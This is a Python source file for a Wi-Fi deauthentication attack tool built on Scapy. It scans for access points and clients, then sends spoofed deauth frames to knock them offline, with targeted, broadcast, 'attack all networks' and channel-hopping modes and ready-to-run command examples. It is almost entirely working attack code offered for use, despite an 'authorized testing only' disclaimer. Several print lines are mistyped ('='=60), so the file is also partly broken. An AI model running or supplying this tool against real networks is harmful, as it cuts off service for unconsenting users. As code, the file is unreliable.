#!/usr/bin/env python3
"""
802.11 Wi-Fi Deauth Attack Tool with Scapy
A comprehensive utility for testing Wi-Fi network security by sending deauthentication
packets to disconnect clients from access points. For authorized security testing only.
"""

import argparse
import sys
import os
import time
import threading
import logging
import signal
import random
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Union
from collections import defaultdict
import subprocess

# Try importing scapy with fallback message
try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, RadioTap
    from scapy.sendrecv import sendp, sniff
    from scapy.error import Scapy_Exception
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Optional imports for enhanced functionality
try:
    from colorama import init, Fore, Style
    COLORAMA_AVAILABLE = True
    init()
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False


class WiFiDeauthAttack:
    """
    Main class for 802.11 Wi-Fi deauthentication attacks
    Implements deauth flooding, targeted client disconnection, and AP scanning
    """
    
    # Standard deauth reason codes
    DEAUTH_REASONS = {
        1: "Unspecified",
        2: "Previous authentication no longer valid",
        3: "Deauthenticated because sending station is leaving",
        4: "Disassociated due to inactivity",
        5: "Disassociated because AP is unable to handle all currently associated stations",
        6: "Class 2 frame received from nonauthenticated station",
        7: "Class 3 frame received from nonassociated station",
        8: "Disassociated because sending station is leaving",
        9: "Station requesting (re)association is not authenticated with responding station"
    }
    
    # Common Wi-Fi channels
    WIFI_CHANNELS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 36, 40, 44, 48, 52, 56, 60, 64, 149, 153, 157, 161, 165]
    
    def __init__(self, interface: str = None, target_bssid: str = None,
                 target_client: str = None, count: int = 0,
                 interval: float = 0.1, reason: int = 3,
                 verbose: bool = False, channel_hopping: bool = False,
                 scan_first: bool = False, scan_time: int = 5):
        """
        Initialize deauth attack
        
        Args:
            interface: Wireless interface in monitor mode
            target_bssid: Target AP MAC address (Broadcast if None)
            target_client: Target client MAC address (Broadcast if None)
            count: Number of deauth packets (0 = continuous)
            interval: Interval between packets
            reason: Deauth reason code
            verbose: Enable verbose output
            channel_hopping: Hop through channels during attack
            scan_first: Scan for networks before attacking
            scan_time: Time to scan per channel
        """
        if not SCAPY_AVAILABLE:
            raise ImportError(
                "scapy module is required. Install with: pip install scapy"
            )
        
        self.interface = interface or self.get_wireless_interface()
        self.target_bssid = target_bssid
        self.target_client = target_client
        self.count = count
        self.interval = interval
        self.reason = reason
        self.verbose = verbose
        self.channel_hopping = channel_hopping
        self.scan_first = scan_first
        self.scan_time = scan_time
        
        # Statistics
        self.stats = {
            'packets_sent': 0,
            'packets_failed': 0,
            'aps_found': 0,
            'clients_found': 0,
            'start_time': None
        }
        
        # Network information
        self.networks = {}  # BSSID -> network info
        self.clients = defaultdict(set)  # BSSID -> set of client MACs
        
        self.running = False
        self.lock = threading.Lock()
        
        # Setup logging
        self.setup_logging()
        
        # Check interface mode
        self.check_interface_mode()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Scan first if requested
        if self.scan_first:
            self.scan_networks()
    
    def setup_logging(self):
        """Configure logging with optional colors"""
        self.logger = logging.getLogger('WiFiDeauth')
        self.logger.handlers.clear()
        
        handler = logging.StreamHandler()
        
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
                f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def get_wireless_interface(self) -> str:
        """Get first wireless interface in monitor mode"""
        try:
            # Try to find a wireless interface
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            
            for line in lines:
                if 'IEEE 802.11' in line:
                    interface = line.split()[0]
                    self.logger.info(f"[+] Found wireless interface: {interface}")
                    return interface
        except Exception:
            pass
        
        # Default fallback
        return 'wlan0mon'
    
    def check_interface_mode(self):
        """Check if interface is in monitor mode"""
        try:
            result = subprocess.run(['iwconfig', self.interface], capture_output=True, text=True)
            if 'Mode:Monitor' not in result.stdout and 'Monitor' not in result.stdout:
                self.logger.warning(f"[!] Interface {self.interface} may not be in monitor mode")
                self.logger.warning("    Set monitor mode with: sudo airmon-ng start " + self.interface)
        except Exception:
            self.logger.warning(f"[!] Could not verify interface mode")
    
    def set_channel(self, channel: int):
        """Set wireless interface channel"""
        try:
            subprocess.run(['iwconfig', self.interface, 'channel', str(channel)], 
                          capture_output=True)
            if self.verbose:
                self.logger.debug(f"[*] Channel set to {channel}")
        except Exception as e:
            self.logger.debug(f"Failed to set channel: {e}")
    
    def channel_hopper(self):
        """Continuously hop through channels"""
        channel_index = 0
        
        while self.running:
            channel = self.WIFI_CHANNELS[channel_index % len(self.WIFI_CHANNELS)]
            self.set_channel(channel)
            
            # Stay on channel for 0.5 seconds
            for _ in range(5):
                if not self.running:
                    break
                time.sleep(0.1)
            
            channel_index += 1
    
    def scan_networks(self):
        """Scan for Wi-Fi networks and clients"""
        self.logger.info(f"[*] Scanning for networks on {self.interface}...")
        
        def packet_handler(packet):
            if packet.haslayer(Dot11):
                # Check for beacon frames (AP advertisement)
                if packet.type == 0 and packet.subtype == 8:  # Beacon
                    bssid = packet[Dot11].addr2
                    if bssid not in self.networks:
                        # Extract network info
                        ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore') if packet.haslayer(Dot11Elt) else "[Hidden]"
                        try:
                            stats = packet[Dot11Beacon].network_stats()
                            channel = stats.get('channel', 0)
                        except Exception:
                            channel = 0
                        
                        self.networks[bssid] = {
                            'ssid': ssid,
                            'channel': channel,
                            'crypto': self.get_encryption(packet)
                        }
                        
                        with self.lock:
                            self.stats['aps_found'] += 1
                        
                        if COLORAMA_AVAILABLE:
                            self.logger.info(
                                f"{Fore.GREEN}[+] AP Found: {bssid} - {ssid} (Ch {channel}){Style.RESET_ALL}"
                            )
                        else:
                            self.logger.info(f"[+] AP Found: {bssid} - {ssid} (Ch {channel})")
                
                # Check for data frames from clients
                elif packet.type == 2:  # Data frames
                    if packet.addr2 and packet.addr1:
                        client = packet.addr2
                        bssid = packet.addr1
                        
                        if bssid in self.networks:
                            if client not in self.clients[bssid]:
                                self.clients[bssid].add(client)
                                with self.lock:
                                    self.stats['clients_found'] += 1
                                
                                if self.verbose:
                                    self.logger.info(
                                        f"[*] Client {client} associated with {bssid}"
                                    )
        
        # Sniff for scan_time seconds
        try:
            sniff(iface=self.interface, prn=packet_handler, timeout=self.scan_time, store=0)
        except Exception as e:
            self.logger.error(f"Scan error: {e}")
        
        # Display scan results
        self.display_scan_results()
    
    def get_encryption(self, packet) -> str:
        """Determine encryption type from beacon frame"""
        encryption = "OPEN"
        
        # Check for privacy bit in capabilities
        cap = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}").split('+')
        
        if 'privacy' in cap:
            encryption = "WEP"
            
            # Check for RSN information (WPA2)
            if packet.haslayer(Dot11Elt) and packet[Dot11Elt].ID == 48:
                encryption = "WPA2"
            # Check for WPA information
            elif packet.haslayer(Dot11Elt) and packet[Dot11Elt].ID == 221:
                if b'\x00\x50\xf2\x01\x01\x00' in bytes(packet[Dot11Elt]):
                    encryption = "WPA"
        
        return encryption
    
    def display_scan_results(self):
        """Display discovered networks and clients"""
        print(f"\n{'='*60}")
        print(f"Scan Results")
        print(f"{'='*60}")
        print(f"Found {self.stats['aps_found']} networks, {self.stats['clients_found']} clients\n")
        
        for bssid, info in self.networks.items():
            print(f"BSSID: {bssid}")
            print(f"  SSID: {info['ssid']}")
            print(f"  Channel: {info['channel']}")
            print(f"  Encryption: {info['crypto']}")
            
            clients = self.clients.get(bssid, set())
            if clients:
                print(f"  Clients ({len(clients)}):")
                for client in list(clients)[:5]:  # Show first 5 clients
                    print(f"    - {client}")
                if len(clients) > 5:
                    print(f"    ... and {len(clients)-5} more")
            print()
        
        print(f"{'='=60}\n")
    
    def create_deauth_packet(self, target_bssid: str, target_client: str = None) -> Packet:
        """
        Create deauthentication packet
        
        Args:
            target_bssid: Target AP MAC address
            target_client: Target client MAC address (None for broadcast)
        
        Returns:
            Deauth packet
        """
        # RadioTap header for proper injection
        radio = RadioTap()
        
        # Dot11 header
        if target_client:
            # Targeted deauth - from AP to specific client
            dot11 = Dot11(
                addr1=target_client,  # Destination (client)
                addr2=target_bssid,   # Source (AP)
                addr3=target_bssid    # BSSID
            )
        else:
            # Broadcast deauth - from AP to all clients
            dot11 = Dot11(
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                addr2=target_bssid,
                addr3=target_bssid
            )
        
        # Deauth frame
        deauth = Dot11Deauth(reason=self.reason)
        
        return radio / dot11 / deauth
    
    def send_deauth_packet(self, packet: Packet) -> bool:
        """
        Send a single deauth packet
        
        Args:
            packet: Deauth packet
        
        Returns:
            Success boolean
        """
        try:
            sendp(packet, iface=self.interface, verbose=0, count=1)
            return True
        except Exception as e:
            if self.verbose:
                self.logger.debug(f"Send error: {e}")
            return False
    
    def attack_targeted(self):
        """Perform targeted deauth attack on specific AP"""
        target_desc = f"{self.target_bssid}"
        if self.target_client:
            target_desc += f" -> {self.target_client}"
        
        self.logger.info(f"[*] Starting targeted deauth on {target_desc}")
        self.logger.info(f"[*] Reason code {self.reason}: {self.DEAUTH_REASONS.get(self.reason, 'Unknown')}")
        self.logger.info(f"[*] {'Continuous' if self.count == 0 else self.count} packets at {1/self.interval:.1f} pps")
        
        packet = self.create_deauth_packet(self.target_bssid, self.target_client)
        
        packet_count = 0
        self.stats['start_time'] = time.time()
        
        try:
            while self.running and (self.count == 0 or packet_count < self.count):
                success = self.send_deauth_packet(packet)
                
                with self.lock:
                    if success:
                        self.stats['packets_sent'] += 1
                    else:
                        self.stats['packets_failed'] += 1
                
                packet_count += 1
                
                # Progress display
                if packet_count % 100 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    rate = packet_count / elapsed if elapsed > 0 else 0
                    
                    self.logger.info(
                        f"[*] Sent {packet_count} packets | Rate: {rate:.1f} pps"
                    )
                
                time.sleep(self.interval)
                
        except KeyboardInterrupt:
            self.logger.info("\n[!] Attack interrupted")
        finally:
            self.show_statistics()
    
    def attack_broadcast(self, bssids: List[str] = None):
        """
        Perform broadcast deauth on multiple APs
        
        Args:
            bssids: List of AP BSSIDs to attack
        """
        if bssids is None:
            bssids = list(self.networks.keys())
        
        self.logger.info(f"[*] Starting broadcast deauth on {len(bssids)} APs")
        
        packets = []
        for bssid in bssids:
            packets.append(self.create_deauth_packet(bssid))
        
        packet_count = 0
        self.stats['start_time'] = time.time()
        
        if TQDM_AVAILABLE and self.verbose:
            pbar = tqdm(total=self.count if self.count > 0 else None, desc="Deauth packets")
        
        try:
            while self.running and (self.count == 0 or packet_count < self.count):
                for packet in packets:
                    success = self.send_deauth_packet(packet)
                    
                    with self.lock:
                        if success:
                            self.stats['packets_sent'] += 1
                        else:
                            self.stats['packets_failed'] += 1
                    
                    packet_count += 1
                    
                    if TQDM_AVAILABLE and self.verbose:
                        pbar.update(1)
                    
                    time.sleep(self.interval / len(packets))
                    
        except KeyboardInterrupt:
            self.logger.info("\n[!] Attack interrupted")
        finally:
            if TQDM_AVAILABLE and self.verbose:
                pbar.close()
            self.show_statistics()
    
    def attack_all_channels(self):
        """Perform deauth attack while hopping channels"""
        self.logger.info(f"[*] Starting channel-hopping deauth attack")
        
        # Start channel hopper thread
        hopper_thread = threading.Thread(target=self.channel_hopper)
        hopper_thread.daemon = True
        hopper_thread.start()
        
        # Perform broadcast attack on all discovered APs
        if self.networks:
            self.attack_broadcast(list(self.networks.keys()))
        else:
            # If no APs discovered, use target
            self.attack_targeted()
    
    def start_attack(self):
        """Start the deauth attack"""
        self.running = True
        
        print(f"\n{'='*60}")
        print(f"802.11 Wi-Fi Deauth Attack Started")
        print(f"{'='*60}")
        print(f"Interface: {self.interface}")
        print(f"Target AP: {self.target_bssid or 'All APs'}")
        print(f"Target Client: {self.target_client or 'Broadcast'}")
        print(f"Reason Code: {self.reason} - {self.DEAUTH_REASONS.get(self.reason, 'Unknown')}")
        print(f"Packet Count: {'Continuous' if self.count == 0 else self.count}")
        print(f"Interval: {self.interval}s ({1/self.interval:.1f} pps)")
        print(f"{'='=60}\n")
        
        # Choose attack mode
        if self.channel_hopping:
            self.attack_all_channels()
        elif self.target_bssid:
            self.attack_targeted()
        elif self.networks:
            self.attack_broadcast()
        else:
            self.logger.error("[-] No target specified and no networks discovered")
    
    def show_statistics(self):
        """Display attack statistics"""
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        
        print(f"\n{'='*60}")
        print(f"Attack Statistics")
        print(f"{'='*60}")
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Packets sent: {self.stats['packets_sent']:,}")
        print(f"Packets failed: {self.stats['packets_failed']:,}")
        if elapsed > 0:
            print(f"Average rate: {self.stats['packets_sent']/elapsed:.1f} pps")
        print(f"{'='=60}\n")
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        self.logger.info("\n[!] Interrupt received, stopping attack...")
        self.running = False
        self.show_statistics()
        sys.exit(0)


class WiFiScanner:
    """
    Wi-Fi network scanner for reconnaissance
    """
    
    def __init__(self, interface: str, verbose: bool = False):
        self.interface = interface
        self.verbose = verbose
        self.networks = {}
        self.clients = defaultdict(set)
        self.setup_logging()
    
    def setup_logging(self):
        """Configure logging"""
        self.logger = logging.getLogger('WiFiScanner')
        handler = logging.StreamHandler()
        
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - %(message)s'
            )
        else:
            formatter = logging.Formatter('%(asctime)s - %(message)s')
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
    
    def packet_handler(self, packet):
        """Handle captured packets"""
        if packet.haslayer(Dot11):
            # Beacons
            if packet.type == 0 and packet.subtype == 8:
                bssid = packet[Dot11].addr2
                if bssid not in self.networks:
                    ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore') if packet.haslayer(Dot11Elt) else "[Hidden]"
                    try:
                        stats = packet[Dot11Beacon].network_stats()
                        channel = stats.get('channel', 0)
                    except Exception:
                        channel = 0
                    
                    self.networks[bssid] = {
                        'ssid': ssid,
                        'channel': channel,
                        'signal': packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else 0
                    }
                    
                    self.logger.info(f"[+] AP: {ssid} ({bssid}) Ch:{channel}")
            
            # Data frames (client activity)
            elif packet.type == 2:
                if packet.addr2 and packet.addr1:
                    client = packet.addr2
                    bssid = packet.addr1
                    self.clients[bssid].add(client)
    
    def scan(self, duration: int = 10):
        """Scan for networks"""
        self.logger.info(f"[*] Scanning on {self.interface} for {duration} seconds...")
        
        try:
            sniff(iface=self.interface, prn=self.packet_handler, timeout=duration, store=0)
        except Exception as e:
            self.logger.error(f"Scan error: {e}")
        
        # Display results
        self.display_results()
        
        return self.networks, self.clients
    
    def display_results(self):
        """Display scan results"""
        print(f"\n{'='*60}")
        print(f"Wi-Fi Scan Results")
        print(f"{'='*60}")
        print(f"Found {len(self.networks)} networks\n")
        
        for bssid, info in self.networks.items():
            print(f"BSSID: {bssid}")
            print(f"  SSID: {info['ssid']}")
            print(f"  Channel: {info['channel']}")
            print(f"  Signal: {info['signal']} dBm")
            
            clients = self.clients.get(bssid, set())
            if clients:
                print(f"  Clients: {len(clients)}")
            print()


def enable_monitor_mode(interface: str) -> Optional[str]:
    """
    Enable monitor mode on interface
    
    Args:
        interface: Interface name
    
    Returns:
        Monitor mode interface name or None
    """
    try:
        # Check if airmon-ng is available
        result = subprocess.run(['which', 'airmon-ng'], capture_output=True)
        
        if result.returncode == 0:
            # Use airmon-ng
            subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                          capture_output=True)
            return f"{interface}mon"
        else:
            # Manual method
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], 
                          capture_output=True)
            subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'control'], 
                          capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], 
                          capture_output=True)
            return interface
            
    except Exception as e:
        print(f"Error enabling monitor mode: {e}")
        return None


def disable_monitor_mode(interface: str):
    """Disable monitor mode"""
    try:
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], 
                      capture_output=True)
        subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'managed'], 
                      capture_output=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], 
                      capture_output=True)
    except Exception as e:
        print(f"Error disabling monitor mode: {e}")


def banner():
    """Display tool banner"""
    banner_text = f"""
{'='*60}
    802.11 Wi-Fi Deauth Attack Tool with Scapy
    For authorized security testing and education only
    Tests: Deauth Flood, Targeted Disconnection, AP Scanning
{'='*60}
    """
    if COLORAMA_AVAILABLE:
        print(f"{Fore.RED}{banner_text}{Style.RESET_ALL}")
    else:
        print(banner_text)


def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='802.11 Wi-Fi Deauth Attack Tool - Test network resilience to deauth attacks',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan for networks first
  sudo python3 wifi_deauth.py --interface wlan0 --scan
  
  # Continuous deauth on specific AP
  sudo python3 wifi_deauth.py --interface wlan0mon --bssid 00:11:22:33:44:55
  
  # Targeted deauth on specific client
  sudo python3 wifi_deauth.py --interface wlan0mon --bssid 00:11:22:33:44:55 --client 66:77:88:99:AA:BB
  
  # Limited number of packets
  sudo python3 wifi_deauth.py --interface wlan0mon --bssid 00:11:22:33:44:55 --count 1000
  
  # Scan then attack all discovered networks
  sudo python3 wifi_deauth.py --interface wlan0mon --scan --attack-all --count 5000
  
  # Channel hopping attack
  sudo python3 wifi_deauth.py --interface wlan0mon --bssid 00:11:22:33:44:55 --channel-hop
  
  # Different deauth reason
  sudo python3 wifi_deauth.py --interface wlan0mon --bssid 00:11:22:33:44:55 --reason 8
  
  # Enable monitor mode automatically
  sudo python3 wifi_deauth.py --interface wlan0 --enable-monitor --scan --attack-all
        """
    )
    
    # Interface options
    parser.add_argument('--interface', '-i', required=True,
                       help='Wireless interface name')
    parser.add_argument('--enable-monitor', action='store_true',
                       help='Enable monitor mode on interface')
    parser.add_argument('--disable-monitor', action='store_true',
                       help='Disable monitor mode after attack')
    
    # Target options
    parser.add_argument('--bssid', help='Target AP MAC address')
    parser.add_argument('--client', help='Target client MAC address')
    parser.add_argument('--attack-all', action='store_true',
                       help='Attack all discovered networks')
    
    # Attack options
    parser.add_argument('--scan', action='store_true',
                       help='Scan for networks before attacking')
    parser.add_argument('--count', type=int, default=0,
                       help='Number of deauth packets (0 = continuous)')
    parser.add_argument('--rate', type=float, default=10.0,
                       help='Packets per second (default: 10)')
    parser.add_argument('--reason', type=int, default=3,
                       help='Deauth reason code (default: 3)')
    parser.add_argument('--channel-hop', action='store_true',
                       help='Hop through channels during attack')
    parser.add_argument('--scan-time', type=int, default=5,
                       help='Scan time per channel (default: 5s)')
    
    # Output options
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output')
    parser.add_argument('--output', '-o', help='Output file for results')
    
    args = parser.parse_args()
    
    # Display banner
    banner()
    
    # Check if scapy is available
    if not SCAPY_AVAILABLE:
        print("[!] scapy module is required. Install with: pip install scapy")
        sys.exit(1)
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("[!] This script requires root privileges for packet injection")
        print("    Please run with: sudo python3 wifi_deauth.py [options]")
        sys.exit(1)
    
    monitor_interface = args.interface
    
    try:
        # Enable monitor mode if requested
        if args.enable_monitor:
            print(f"[*] Enabling monitor mode on {args.interface}...")
            monitor_interface = enable_monitor_mode(args.interface)
            if monitor_interface:
                print(f"[+] Monitor mode enabled on {monitor_interface}")
            else:
                print("[-] Failed to enable monitor mode")
                sys.exit(1)
        
        # Initialize attack
        attack = WiFiDeauthAttack(
            interface=monitor_interface,
            target_bssid=args.bssid,
            target_client=args.client,
            count=args.count,
            interval=1.0/args.rate,
            reason=args.reason,
            verbose=args.verbose,
            channel_hopping=args.channel_hop,
            scan_first=args.scan,
            scan_time=args.scan_time
        )
        
        # Perform scan only if requested without attack
        if args.scan and not args.bssid and not args.attack_all:
            attack.display_scan_results()
        
        # Start attack
        elif args.attack_all and attack.networks:
            attack.attack_broadcast()
        
        elif args.bssid:
            attack.start_attack()
        
        else:
            print("[!] No attack target specified. Use --bssid or --attack-all")
            parser.print_help()
        
        # Save results if requested
        if args.output and attack.stats['packets_sent'] > 0:
            with open(args.output, 'w') as f:
                f.write(f"Wi-Fi Deauth Attack Results\n")
                f.write(f"Time: {datetime.now().isoformat()}\n")
                f.write(f"Interface: {monitor_interface}\n")
                f.write(f"Target BSSID: {args.bssid}\n")
                f.write(f"Target Client: {args.client}\n")
                f.write(f"Packets Sent: {attack.stats['packets_sent']}\n")
                f.write(f"Duration: {attack.stats.get('duration', 0)}\n")
            
            print(f"[+] Results saved to {args.output}")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
    finally:
        # Disable monitor mode if requested
        if args.disable_monitor and monitor_interface != args.interface:
            print(f"[*] Disabling monitor mode...")
            disable_monitor_mode(monitor_interface)


if __name__ == "__main__":
    main()
